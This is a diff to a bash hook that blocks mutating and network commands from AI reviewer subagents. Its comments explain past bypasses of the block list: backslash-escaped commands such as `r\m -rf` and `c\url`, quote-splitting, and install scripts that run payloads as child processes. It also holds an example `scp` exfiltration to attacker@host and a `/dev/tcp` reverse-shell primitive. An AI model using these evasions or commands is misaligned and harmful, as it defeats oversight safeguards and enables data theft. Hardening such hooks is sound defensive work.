@@ -99,10 +99,18 @@ fi
 # contain the contiguous substring "rm" for \b matching to see) can't hide a token.
 UNQUOTED=$(printf '%s' "$NORMALIZED" | sed -E "s/[\"']//g")
 
+# Strip backslash-escapes the same way: outside single quotes (already stripped above),
+# bash removes a backslash and keeps the following character literally, so `r\m -rf`
+# executes as `rm -rf` while the literal text "r\m" never contains the contiguous
+# substring "rm" for \b matching to see -- the same underlying class of bypass as
+# quote-splitting, just via a different bash quoting mechanism. `\.` -> `.` keeps the
+# escaped character.
+UNESCAPED=$(printf '%s' "$UNQUOTED" | sed -E 's/\\(.)/\1/g')
+
 # Strip the common /dev/null redirect idiom before the mutation check so legitimate
 # read-only commands (`grep ... 2>/dev/null`, `git log ... 2>/dev/null`) aren't
 # false-positived by the generic `>` pattern below.
-CHECK_COMMAND=$(printf '%s' "$UNQUOTED" | sed -E 's#[0-9]?>>?[[:space:]]*/dev/null##g')
+CHECK_COMMAND=$(printf '%s' "$UNESCAPED" | sed -E 's#[0-9]?>>?[[:space:]]*/dev/null##g')
 
 # Each alternative below corresponds to a category documented in code_reviewer.md:
 # git mutations | filesystem mutations | remote pipe/heredoc execution |
@@ -136,23 +144,43 @@ BLOCK_PATTERN+='|\bfind\b.*(-delete\b|-exec\s+(rm|mv|chmod|chown|dd|cp)\b)'
 # starting with a digit (`>1x.sh`) evaded detection entirely; digit-prefixed fd-target
 # redirects (`2>&1`) are still correctly excluded because `&` itself is the excluded
 # char, immediately after `>`, regardless of what precedes `>`.
-# sed in-place: covers the attached-suffix short form (`-ibak`, no space -- GNU sed
-# accepts a suffix glued directly onto -i) and the GNU long option (`--in-place`,
-# `--in-place=.bak`). A prior version only matched bare `-i` with mandatory trailing
-# whitespace, which a suffix like `-ibak` defeated (nothing to anchor `\b` on between
-# "-i" and "bak" -- they're one token). Requires a preceding space so this doesn't
-# fire on a quoted search pattern that happens to contain the substring "-i".
-BLOCK_PATTERN+='|\bsed\b.*[[:space:]]-i[a-zA-Z0-9._-]*\b|\bsed\b.*--in-place\b'
+# sed/perl/ruby in-place: covers the attached-suffix short form (`-ibak`, no space --
+# GNU sed/perl accept a suffix glued directly onto -i) and sed's GNU long option
+# (`--in-place`, `--in-place=.bak`). A prior version only matched bare `sed -i` with
+# mandatory trailing whitespace, which a suffix like `-ibak` defeated (nothing to
+# anchor `\b` on between "-i" and "bak" -- they're one token), and didn't cover
+# perl -i/ruby -i at all despite sharing the exact same in-place-edit semantics.
+# Requires a preceding space so this doesn't fire on a quoted search pattern that
+# happens to contain the substring "-i".
+BLOCK_PATTERN+='|\b(sed|perl|ruby)\b.*[[:space:]]-i[a-zA-Z0-9._-]*\b|\bsed\b.*--in-place\b'
 BLOCK_PATTERN+="|>\\s*[^&]|\\btee\\b"
-BLOCK_PATTERN+='|(curl|wget).*\|\s*(sh|bash)'
-# scp/ssh/rsync/sftp: no legitimate read-only-review need, and unlike curl/wget these
-# require no special flag or pipe target to exfiltrate the workspace (plain
-# `scp -r . attacker@host:/tmp/` needs no obfuscation at all) -- block outright.
-BLOCK_PATTERN+='|\b(scp|ssh|rsync|sftp)\b'
+# curl/wget/scp/ssh/rsync/sftp: no legitimate read-only-review need for any network
+# tool -- block outright rather than only the curl|bash pipe form. This hook's own
+# BLOCK_PATTERN previously relied on layer 2 (native permissions.deny) to cover bare
+# curl/wget, but that layer likely does literal-prefix matching too and is just as
+# exposed to the backslash-escape bypass fixed above (`c\url`) -- Claude Code's engine
+# is closed-source here, so this hook can't assume layer 2 covers what its own
+# blocklist doesn't. Blocking bare curl/wget here as well is a real backstop, not
+# redundant with layer 2.
+BLOCK_PATTERN+='|\b(curl|wget|scp|ssh|rsync|sftp)\b'
+# /dev/tcp and /dev/udp are bash's built-in pseudo-devices for raw socket I/O --
+# `bash -s < /dev/tcp/host/port` is a classic reverse-shell primitive that needs no
+# curl/wget/nc and so evades every network-tool-name-based rule above.
+BLOCK_PATTERN+='|/dev/(tcp|udp)/'
 BLOCK_PATTERN+="|\\b(kubectl|oc)\\s+${GIT_GAP}(apply|delete|patch|edit|scale)\\b|\\bnpm\\s+(publish|version)\\b"
+# Dependency-install commands can trigger arbitrary code (npm postinstall scripts,
+# setup.py, Makefile recipes) as a CHILD process of a benign-looking parent -- the
+# payload never appears in $COMMAND for BLOCK_PATTERN to inspect at all, so this
+# can't be closed by pattern-matching the install command's own text; it has to be
+# closed by never running the install in the first place. No legitimate review need:
+# reviewing a diff evaluates existing code, it doesn't require installing new
+# packages (confirmed by this review's own verification usage: pytest/tsc/helm are
+# already-installed binaries, never triggered via a fresh install).
+BLOCK_PATTERN+='|\b(npm|yarn|pnpm)\s+(install|add|ci)\b|\bpip3?\s+install\b|\bpoetry\s+(install|add)\b'
+BLOCK_PATTERN+='|\bbundle\s+install\b|\bcargo\s+install\b|\bgo\s+install\b|\bgem\s+install\b|\bmake\b'
 BLOCK_PATTERN+='|\b(bash|sh|zsh)\s+(-\S+\s+)*-c\b|\|\s*(bash|sh|zsh)\b'
-BLOCK_PATTERN+='|\bpython3?\s+(-\S+\s+)*-c\b|\bnode\s+(-\S+\s+)*(-e|--eval)\b|\bperl\s+(-\S+\s+)*-e\b|\bruby\s+(-\S+\s+)*-e\b|\|\s*(python3?|node|perl|ruby)\b'
-BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby)\s*(<<|<[[:space:]])'
+BLOCK_PATTERN+='|\bpython3?\s+(-\S+\s+)*-c\b|\bnode\s+(-\S+\s+)*(-e|--eval)\b|\bperl\s+(-\S+\s+)*-e\b|\bruby\s+(-\S+\s+)*-e\b|\|\s*(python3?|node|perl|ruby|deno|bun)\b'
+BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby|deno|bun)\s*(<<|<[[:space:]])'
 # Bare "<interpreter> <file>" (no -c/-e/heredoc/pipe) runs an arbitrary script FILE --
 # a pre-existing malicious script committed to the reviewed repo needs no write at
 # all, only invocation, so write-detection above doesn't cover this path. The next
@@ -160,19 +188,30 @@ BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby)\s*(<<|<[[:space:]])'
 # to be allowed; anything else (a path, a bare filename) is blocked. This is stricter
 # than "no legitimate use exists" -- it is "no legitimate use was found in this
 # review's own verification commands" (helm/tsc/pytest are standalone binaries, not
-# `python3 <file>` invocations), so the trade-off leans safe over permissive.
-BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby)\s+[^-[:space:]]'
+# `python3 <file>` invocations), so the trade-off leans safe over permissive. Includes
+# awk/gawk/php/lua/Rscript/deno/bun alongside the original bash/sh/zsh/python/node/
+# perl/ruby set -- an enumerated interpreter list is inherently open-ended (there is
+# always one more exotic interpreter); this is documented, accepted residual risk,
+# not a claim of completeness.
+BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby|awk|gawk|php|lua|Rscript|deno|bun)\s+[^-[:space:]]'
+# awk/gawk -i inplace is a GNU extension that mutates a file internally (the write
+# never appears as a shell redirect, so the generic `>` check can't see it either).
+BLOCK_PATTERN+='|\b(awk|gawk)\b.*-i[[:space:]]*inplace\b'
 
 if printf '%s\n' "$CHECK_COMMAND" | grep -qiE "$BLOCK_PATTERN"; then
   # Bound + redact the logged command: blocked commands can legitimately contain
   # secrets (e.g. a curl -H "Authorization: Bearer ...") that must not reach pod logs.
-  # Covers bearer/basic auth headers, generic key=value secrets, basic-auth-in-URL
+  # Covers bearer/basic auth headers (the full "Authorization: Bearer <token>" span,
+  # not just leftmost-matching "Authorization:" and leaving the token itself exposed),
+  # curl -u user:pass basic auth, generic key=value secrets, basic-auth-in-URL
   # (https://user:pass@host), and common vendor token prefixes (GitHub ghp_/gho_,
   # GitLab glpat-, AWS AKIA) -- not exhaustive, but closes the specific gaps found
-  # in review (colon-delimited custom headers, PAT-prefixed tokens).
+  # in review (colon-delimited custom headers, PAT-prefixed tokens, -u flag).
   LOG_COMMAND=$(printf '%s' "$COMMAND" \
     | sed -E 's#://[^/@[:space:]]+:[^/@[:space:]]+@#://<redacted>@#g' \
-    | sed -E 's/(Bearer|Authorization:|[A-Za-z_-]*(token|password|apikey|api_key|secret)[[:space:]]*[:=])[[:space:]]*[^[:space:]]*/\1 <redacted>/gi' \
+    | sed -E 's/Authorization:[[:space:]]*(Bearer|Basic)[[:space:]]+[^[:space:]"'"'"']*/Authorization: \1 <redacted>/gi' \
+    | sed -E 's/(^|[[:space:]])-u[[:space:]]+[^[:space:]]+:[^[:space:]]*/\1-u <redacted>/g' \
+    | sed -E 's/([A-Za-z_-]*(token|password|apikey|api_key|secret)[[:space:]]*[:=])[[:space:]]*[^[:space:]]*/\1 <redacted>/gi' \
     | sed -E 's/\b(ghp_|gho_|ghu_|ghs_|glpat-|AKIA)[A-Za-z0-9_-]+/\1<redacted>/g' \
     | cut -c1-200)
   echo "Blocked: reviewer subagents are read-only. Command matched a mutation pattern: $LOG_COMMAND" >&2
